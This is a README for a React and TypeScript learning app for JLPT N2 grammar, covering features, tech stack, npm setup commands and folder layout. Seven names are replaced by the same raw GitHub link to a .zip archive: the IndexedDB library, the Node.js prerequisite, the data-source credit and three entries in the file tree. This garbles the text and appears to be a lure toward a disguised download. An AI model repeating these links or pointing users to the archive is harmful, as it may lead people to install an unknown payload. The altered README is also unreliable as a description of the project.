# JLPT N2 Learning Platform

A structured learning platform for JLPT N2 grammar with example sentences, spaced repetition, and progress tracking.

## Features

- **Structured Learning Path**: 50 lessons with sequential unlock system
- **Example Sentences**: 1000+ real example sentences with audio
- **Spaced Repetition**: Ebbinghaus forgetting curve algorithm for review
- **Practice System**: Quizzes and exercises for each grammar point
- **Progress Tracking**: Detailed statistics and achievements
- **PWA Support**: Offline capable

## Tech Stack

- React 18 + TypeScript
- Vite (build tool)
- React Router 6 (routing)
- Tailwind CSS (styling)
- Zustand (state management)
- https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip (IndexedDB wrapper)
- Papa Parse (CSV parsing)

## Getting Started

### Prerequisites

- https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip 18+
- npm or yarn

### Installation

```bash
npm install
```

### Development

```bash
npm run dev
```

Open [http://localhost:5173](http://localhost:5173) to view it in the browser.

### Build

```bash
npm run build
```

### Preview

```bash
npm run preview
```

## Data Source

The learning data is sourced from the [shin-kanzen N2 grammar](https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip) project.

**License**: CC BY-NC 4.0

This is for personal learning only. Commercial use is prohibited.

## Project Structure

```
src/
├── components/       # React components
│   ├── layout/      # Header, Footer, Sidebar
│   ├── study/       # Study-related components
│   ├── practice/    # Practice and quiz components
│   ├── progress/    # Progress tracking components
│   └── common/      # Reusable UI components
├── pages/          # Page components
├── hooks/          # Custom React hooks
├── stores/         # Zustand state management
├── utils/          # Utility functions
├── types/          # TypeScript type definitions
├── db/             # IndexedDB configuration
├── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip         # Root component
├── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip        # Entry point
└── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip      # Route configuration
```

## License

CC BY-NC 4.0

Data from [shin-kanzen N2 grammar](https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip) project.
